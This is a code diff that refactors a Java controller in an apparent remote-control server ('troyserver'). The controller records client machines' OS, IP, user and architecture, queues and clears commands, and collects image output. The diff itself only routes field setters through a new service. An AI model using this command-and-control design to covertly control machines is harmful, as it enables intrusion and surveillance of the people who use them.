@@ -6,6 +6,7 @@ import ch.lebois.troyserver.data.entity.Message;
 import ch.lebois.troyserver.data.repository.ClientRepository;
 import ch.lebois.troyserver.data.repository.ImageRepository;
 import ch.lebois.troyserver.data.repository.MessageRepository;
+import ch.lebois.troyserver.service.ClientFieldService;
 import ch.lebois.troyserver.service.DateService;
 import ch.lebois.troyserver.service.ImageService;
 import java.util.ArrayList;
@@ -27,20 +28,20 @@ public class ServerReceiverController {
 
     private ImageService imageService;
     private DateService dateService;
-
+    private ClientFieldService clientFieldService;
 
     private Client client;
-    private int allBytesSize;
     private Message imgLoader;
 
     public ServerReceiverController(ClientRepository clientRepository, MessageRepository messageRepository,
                                     ImageService imageService, ImageRepository imageRepository,
-                                    DateService dateService) {
+                                    DateService dateService, ClientFieldService clientFieldService) {
         this.clientRepository = clientRepository;
         this.messageRepository = messageRepository;
         this.imageService = imageService;
         this.imageRepository = imageRepository;
         this.dateService = dateService;
+        this.clientFieldService = clientFieldService;
     }
 
     @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
@@ -52,19 +53,19 @@ public class ServerReceiverController {
 
         switch (typeParam) {
             case "refresh":
-                client.setRefreshtime(valueParam);
+                clientFieldService.setFieldValue(client, "refreshtime", valueParam);
                 break;
             case "os":
-                client.setOs(valueParam);
+                clientFieldService.setFieldValue(client, "os", valueParam);
                 break;
             case "ip":
-                client.setIp(valueParam);
+                clientFieldService.setFieldValue(client, "ip", valueParam);
                 break;
             case "user":
-                client.setPcuser(valueParam);
+                clientFieldService.setFieldValue(client, "pcuser", valueParam);
                 break;
             case "arch":
-                client.setArch(valueParam);
+                clientFieldService.setFieldValue(client, "arch", valueParam);
                 break;
             case "online":
                 break;
@@ -73,7 +74,6 @@ public class ServerReceiverController {
                 clearCommands();
                 break;
             case "imgSize":
-                allBytesSize = Integer.valueOf(valueParam);
                 imgLoader = new Message();
                 imgLoader.setPcNameFk(clientParam);
                 imgLoader.setType("commandout");
@@ -96,7 +96,7 @@ public class ServerReceiverController {
     }
 
     private void lastSeen() {
-        client.setLastseen(dateService.getDate());
+        clientFieldService.setFieldValue(client, "lastseen", dateService.getDate());
         clientRepository.save(client);
     }
 
@@ -105,11 +105,10 @@ public class ServerReceiverController {
         if (client == null) {
             client = new Client();
             client.setPcName(clientParam);
-            client.setPcNickname(clientParam);
-            client.setRefreshtime("");
+            clientFieldService.setFieldValue(client, "nickname", clientParam);
+            clientFieldService.setFieldValue(client, "refreshtime", "");
             clientRepository.save(client);
         }
-
         return client;
     }
 
@@ -135,7 +134,7 @@ public class ServerReceiverController {
     }
 
     private void clearCommands() {
-        client.setCommands("");
+        clientFieldService.setFieldValue(client, "command", "");
     }
 
     private void createMessage(String clientName, String messageType, String messageValue) {
